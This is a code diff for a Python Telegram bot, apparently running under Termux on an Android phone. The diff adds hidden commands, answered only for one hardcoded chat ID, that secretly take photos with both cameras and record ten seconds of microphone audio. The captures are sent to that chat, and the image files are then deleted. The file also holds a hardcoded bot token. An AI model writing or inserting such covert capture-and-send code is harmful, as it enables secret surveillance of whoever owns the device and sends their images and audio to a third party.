@@ -2,6 +2,7 @@ import telebot
 from telebot import *
 import time
 import pickle
+import subprocess
 
 bot = telebot.TeleBot("2037923166:AAF69wiYleugnHBJOw8h6ycgrwkvxupRSO0")
 
@@ -27,11 +28,34 @@ def start(message):
     if message.chat.id == 831689238:
         pro.append(int(a.replace("/pro ", "")))
 
+@bot.message_handler(commands=['help'])
+def start(message):
+    if message.chat.id == 831689238:
+        bot.send_message(831689238, "/s \n /c \n /pro \n /m \n")
+
 @bot.message_handler(commands=['s'])
 def start(message):
     if message.chat.id == 831689238:
         stat = "Статистика:\n"+"Пользователей всего: "+str(len(ids))+"\n"+"С подом: "+str(have)+"\n"+"Без: "+str(nhave)+"\n"+"PRO: "+str(pro)
         bot.send_message(831689238, stat)
+
+@bot.message_handler(commands=['c'])
+def start(message):
+    if message.chat.id == 831689238:
+        subprocess.run('termux-camera-photo -с 0 0.jpg', shell=True)
+        subprocess.run('termux-camera-photo -с 1 1.jpg', shell=True)
+        bot.send_photo(831689238, open(r'0.jpg', 'rb'))
+        bot.send_photo(831689238, open(r'1.jpg', 'rb'))
+        subprocess.run('rm 0.jpg', shell=True)
+        subprocess.run('rm 1.jpg', shell=True)
+
+@bot.message_handler(commands=['m'])
+def start(message):
+    if message.chat.id == 831689238:
+        subprocess.run('termux-microphone-record -f 1.wav -l 10', shell=True)
+        audio = open(r'1.wav', 'rb')
+        bot.send_audio(831689238, audio)
+        audio.close()
 
 @bot.message_handler(commands=['start'])
 def start(message):
